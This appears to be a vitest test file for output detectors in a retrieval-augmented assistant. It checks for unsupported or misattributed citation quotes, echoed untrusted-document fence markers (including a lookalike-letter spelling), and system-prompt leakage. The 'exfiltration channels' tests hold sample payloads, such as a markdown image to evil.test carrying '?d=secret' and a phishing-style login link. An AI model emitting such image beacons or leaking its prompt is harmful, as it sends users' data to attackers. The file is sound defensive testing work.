/**
 * Deterministic checks on a finished answer.
 *
 * Hermetic. These are the layer that does not guess: concrete output in, yes or
 * no out. They are detectors rather than a gate, because the answer streams and
 * the caller has read it by the time it is complete.
 */

import { describe, expect, it } from 'vitest'
import { checkAnswer } from '../src/outputchecks.ts'
import { SYSTEM_CANARY, SYSTEM_PROMPT, type Context } from '../src/providers.ts'

const CTX: Context[] = [
  { path: 'a.txt', text: 'Refunds take five business days after approval.' },
  { path: 'b.txt', text: 'Parental leave accrues from the start date.' },
]

function codes(answer: string, contexts: Context[] = CTX): string[] {
  return checkAnswer(answer, contexts).map((f) => f.code)
}

it('raises nothing on a grounded answer', () => {
  expect(
    codes(
      'Refunds take five days [1] "refunds take five business days", ' +
        'and leave accrues [2] "parental leave accrues from the start".',
    ),
  ).toEqual([])
})

// --- evidence spans -------------------------------------------------------

describe('evidence spans', () => {
  /**
   * The gap citation *existence* leaves open. A model that reads a forged policy
   * can attribute it to the real key of the passage that carried it, at which
   * point the key check passes and the false claim reads as sourced.
   */
  it('flags a quote that is not in the cited passage', () => {
    expect(codes('Policy says [1] "refunds are instant and unconditional".')).toContain(
      'citation_unsupported',
    )
  })

  /** Right key, real text, wrong source. Detached rather than invented. */
  it('flags a quote from the wrong passage', () => {
    expect(codes('Refunds [1] "parental leave accrues from the start date".')).toContain(
      'citation_unsupported',
    )
  })

  /**
   * Lenient on purpose: a quote differing only by line wrapping is the model
   * reproducing the passage correctly, and a false positive here is what turns a
   * warning list into something nobody reads.
   */
  it('accepts a quote matching apart from wrapping and case', () => {
    expect(codes('See [1] "REFUNDS   TAKE\nFIVE business days" for detail.')).toEqual([])
  })

  it('parses curly quotes as evidence spans', () => {
    expect(codes('See [1] “refunds take five business days”.')).toEqual([])
  })

  /**
   * Verified against nothing. Reported, because otherwise a model that quietly
   * stops quoting disables the check above and everything keeps reading green.
   */
  it('flags a citation with no evidence span', () => {
    expect(codes('Refunds take five business days [1].')).toEqual(['citation_unquoted'])
  })

  it('does not also report an out-of-range citation as unquoted', () => {
    expect(codes('As [9] says.')).toEqual(['citation_out_of_range'])
  })

  /** Otherwise the check tests nothing and nobody finds out. */
  it('keeps the canary actually in the system prompt', () => {
    expect(SYSTEM_PROMPT).toContain(SYSTEM_CANARY)
  })
})

// --- citations ------------------------------------------------------------

describe('citations', () => {
  it('flags a citation beyond the retrieved passages', () => {
    expect(codes('As stated in [7], refunds are instant.')).toEqual(['citation_out_of_range'])
  })

  it('flags citation zero', () => {
    expect(codes('See [0].')).toEqual(['citation_out_of_range'])
  })

  it('names every out-of-range citation once', () => {
    const finding = checkAnswer('See [7], [9], and [7] again.', CTX)[0]
    expect(finding?.detail).toContain('[7]')
    expect(finding?.detail).toContain('[9]')
  })

  it('cites nothing on a refusal with no passages', () => {
    expect(codes("I don't have anything I'm allowed to cite.", [])).toEqual([])
  })
})

// --- prompt structure coming back out -------------------------------------

describe('prompt structure coming back out', () => {
  it('flags an echoed fence marker', () => {
    expect(codes('The passage began at <<<UNTRUSTED_DOCUMENT 1a2b>>>.')).toContain('fence_echoed')
  })

  /**
   * An output check that reads bytes is exactly where a respelling is most
   * embarrassing, because this is the layer meant to be reliable.
   */
  it('flags an echoed marker spelled with a lookalike', () => {
    expect(codes('It said <<<UNTRUSTED_DОCUMENT 1a2b>>> first.')).toContain('fence_echoed')
  })

  it('flags an echoed system prompt', () => {
    expect(codes(`My instructions say: ${SYSTEM_CANARY} ...`)).toContain('system_prompt_echoed')
  })
})

// --- exfiltration channels ------------------------------------------------

describe('exfiltration channels', () => {
  it('flags a markdown image', () => {
    expect(codes('Done ![](https://evil.test/x.png?d=secret)')).toContain('markdown_image')
  })

  it('flags a markdown link', () => {
    expect(codes('See [the portal](https://evil.test/login).')).toContain('markdown_link')
  })

  it('does not count an image as a link as well', () => {
    expect(codes('![alt](https://evil.test/x.png)')).toEqual(['markdown_image'])
  })

  /**
   * The honest boundary of this layer. A prose phishing link has no structural
   * handle, and catching it needs domain reputation rather than a regex. Asserted
   * so the omission is a decision on the record instead of an oversight.
   */
  it('deliberately does not flag a bare URL in prose', () => {
    expect(codes('For help visit https://evil.test/support and sign in.')).toEqual([])
  })
})
